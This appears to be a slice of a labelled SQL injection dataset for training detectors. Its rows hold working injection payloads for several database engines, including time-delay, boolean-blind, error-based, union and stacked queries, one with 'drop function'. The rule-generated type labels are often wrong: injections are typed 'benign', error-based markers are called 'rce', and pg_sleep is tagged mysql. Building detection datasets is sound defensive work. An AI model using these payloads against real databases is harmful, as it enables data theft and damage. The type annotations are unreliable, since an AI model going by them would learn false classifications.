row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
6930,select ( case when ( 5142 = 6855 ) then 5142 else 5142* ( select 5142 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6931,select ( case when ( 9130 = 1826 ) then 9130 else 9130* ( select 9130 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6932,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'ugum' like 'ugum",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
6933,1%' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6934,"1%' or elt ( 6272 = 6272,sleep ( 5 ) ) and '%' = '",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6935,"1%"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ""%"" = """,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
6936,1'+ ( select ksoh where 6339 = 6339,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6937,1 ) ) as pmff where 6649 = 6649,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6938,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
6939,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ||'",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
6940,"1"" ) ) ) and 7135 = 8805#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6941,"1"" ) ) as xcyo where 2929 = 2929",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6942,"-8600"" or elt ( 1032 = 1032,3623 ) and ""kfsn"" like ""kfsn",1,,boolean_blind,generic,0.95,"like "" detected — boolean_blind injection (priority 8) on generic",rule-based
6943,1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and 'gpax' = 'gpax,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6944,"select * from generate_series ( 6200,6200,case when ( 6200 = 5449 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
6945,"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and 'gbpg' = 'gbpg",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
6946,select ( case when ( 7169 = 7785 ) then 1 else 7169* ( select 7169 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6947,"1"" ) ) ) and sleep ( 5 ) and ( ( ( ""fdvc"" like ""fdvc",1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
6948,"1' where 1230 = 1230 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,1230 = 1230 or detected — boolean_blind injection (priority 8) on generic,rule-based
6949,"select * from generate_series ( 9964,9964,case when ( 9964 = 4455 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
6950,select case when 6662 = 9889 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6951,1 ) ) as xoch where 8765 = 8765 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
6952,select ( case when ( 6045 = 2786 ) then 6045 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6953,1' ) and 7533 = 7533 and ( 'cryr' = 'cryr,1,,boolean_blind,generic,0.95,7533 = 7533 and detected — boolean_blind injection (priority 8) on generic,rule-based
6954,"1 ) and elt ( 3138 = 1817,1817 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6955,-2214' ) union all select 8228#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6956,if ( 4194 = 4133 ) select 4194 else drop function tqhz--,1,,stacked_queries,generic,0.95,drop function detected — stacked_queries injection (priority 3) on generic,rule-based
6957,"1 ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
6958,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'qtfl' = 'qtfl",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
6959,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) # kfza",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
